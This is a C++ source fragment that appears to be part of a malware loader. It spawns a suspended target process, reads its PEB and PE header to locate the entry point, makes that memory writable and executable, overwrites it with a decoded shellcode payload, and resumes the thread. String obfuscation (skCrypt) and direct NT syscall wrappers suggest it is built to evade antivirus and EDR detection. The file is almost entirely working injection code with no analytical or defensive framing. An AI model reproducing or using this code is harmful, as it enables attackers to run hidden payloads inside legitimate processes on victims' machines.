




PROCESS_INFORMATION pi = SpawnProc((LPSTR)skCrypt("###TARGET_PROCESS###"), hParent);
if (pi.hProcess == INVALID_HANDLE_VALUE || pi.hThread == INVALID_HANDLE_VALUE)
    return 0;

HANDLE hProcess = pi.hProcess;
HANDLE hThread = pi.hThread;
PROCESS_BASIC_INFORMATION bi;
ULONG tmp;

res = NewNtQueryInformationProcess(hProcess, (PROCESSINFOCLASS)0, &bi, sizeof(bi), &tmp);

if (res != 0)
{
    safe_print(skCrypt("NtQueryInformationProcess FAILED to query created process, exiting: "), res);
    return 0;
}
else
{
    safe_print(skCrypt("NtQueryInformationProcess queried the created process sucessfully."));
}

__int64 TEST = (__int64)bi.PebBaseAddress;
__int64 TEST2 = TEST + 0x10;
PVOID ptrImageBaseAddress = (PVOID)TEST2;

auto eString = skCrypt("bi.PebBaseAddress: ");
printf("%s%#p\\n", eString.decrypt(), bi.PebBaseAddress);
eString.clear();
auto eString2 = skCrypt("ptrImageBaseAddress: ");
printf("%s%#p\\n", eString2.decrypt(), ptrImageBaseAddress);
eString2.clear();

PVOID baseAddressBytes;
unsigned char data[513];
SIZE_T nBytes;

res = NtReadVirtualMemory(hProcess, ptrImageBaseAddress, &baseAddressBytes, sizeof(PVOID), &nBytes);

if (res != 0)
{
    safe_print(skCrypt("NtReadVirtualMemory FAILED to read image base address, exiting: "), res);
    return 0;
}
else
{
    safe_print(skCrypt("NtReadVirtualMemory read image base address successfully."));
}

auto eString3 = skCrypt("baseAddressBytes: ");
printf("%s%#p\\n", eString3.decrypt(), baseAddressBytes);
eString3.clear();

PVOID imageBaseAddress = (PVOID)(__int64)(baseAddressBytes);

res = NtReadVirtualMemory(hProcess, imageBaseAddress, &data, sizeof(data), &nBytes);

if (res != 0)
{
    safe_print(skCrypt("NtReadVirtualMemory FAILED to read first 0x200 bytes of the PE structure, exiting: "), res);
    auto eString4 = skCrypt("nBytes: ");
    printf("%s%#p\\n", eString4.decrypt(), nBytes);
    eString4.clear();
    return 0;
}
else
{
    safe_print(skCrypt("NtReadVirtualMemory read first 0x200 bytes of the PE structure successfully."));
}

uint32_t e_lfanew = *reinterpret_cast<uint32_t *>(data + 0x3c);
// std::cout << "e_lfanew: " << e_lfanew << std::endl;
uint32_t entrypointRvaOffset = e_lfanew + 0x28;
// std::cout << "entrypointRvaOffset: " << entrypointRvaOffset << std::endl;
uint32_t entrypointRva = *reinterpret_cast<uint32_t *>(data + entrypointRvaOffset);
// std::cout << "entrypointRva: " << entrypointRva << std::endl;
__int64 rvaconv = (__int64)imageBaseAddress;
__int64 rvaconv2 = rvaconv + entrypointRva;
PVOID entrypointAddress = (PVOID)rvaconv2;
auto eString5 = skCrypt("entrypointAddress: ");
printf("%s%#p\\n", eString5.decrypt(), entrypointAddress);
eString5.clear();

ULONG oldprotect;
SIZE_T bytesWritten;
SIZE_T shellcodeLength = payload_len;

res = NtProtectVirtualMemory(hProcess, &entrypointAddress, &shellcodeLength, 0x40, &oldprotect);

if (res != 0)
{
    safe_print(skCrypt("NtProtectVirtualMemory FAILED to set permissions on entrypointAddress: "), res);
    return 0;
}
else
{
    safe_print(skCrypt("NtProtectVirtualMemory set permissions on entrypointAddress successfully."));
}

res = NtWriteVirtualMemory(hProcess, entrypointAddress, decoded, payload_len, &bytesWritten);

if (res != 0)
{
    safe_print(skCrypt("NtWriteVirtualMemory FAILED to write decoded payload to entrypointAddress: "), res);
    return 0;
}
else
{
    safe_print(skCrypt("NtWriteVirtualMemory wrote decoded payload to entrypointAddress successfully."));
}

res = NtProtectVirtualMemory(hProcess, &entrypointAddress, &shellcodeLength, oldprotect, &tmp);
if (res != 0)
{
    safe_print(skCrypt("NtProtectVirtualMemory FAILED to revert permissions on entrypointAddress: "), res);
    return 0;
}
else
{
    safe_print(skCrypt("NtProtectVirtualMemory revert permissions on entrypointAddress successfully."));
}

res = NtResumeThread(hThread, &tmp);
if (res != 0)
{
    safe_print(skCrypt("NtResumeThread FAILED to to resume thread: "), res);
    return 0;
}
else
{
    safe_print(skCrypt("NtResumeThread resumed thread successfully."));
}

NewNtClose(hProcess);
NewNtClose(hThread);